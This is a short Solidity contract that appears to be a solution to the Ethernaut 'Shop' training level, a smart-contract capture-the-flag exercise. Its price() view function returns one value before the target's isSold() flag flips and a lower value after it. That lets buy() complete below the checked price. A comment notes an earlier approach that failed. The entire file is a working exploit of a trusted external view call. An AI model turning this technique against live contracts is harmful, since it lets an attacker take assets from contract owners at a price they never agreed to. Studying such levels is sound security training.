// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{Shop} from "Ethernaut_Shop/shop.sol";

contract attack {
    // bool fraud;
    uint256 price1 = 100;
    uint256 price2 = 80;
    Shop target;
    constructor(Shop _target){
        target = _target;
    }
    function price() external view returns (uint256){
        // if(!fraud){
        //     fraud = true;
        //     return price1;
        // } this doesnt work because "view" state mutability restricts any state changes
        if (!target.isSold()) {
            return price1;
        }
        else {
            return price2;
        }
    }
    function attackContract() public{
        target.buy();
    }
}

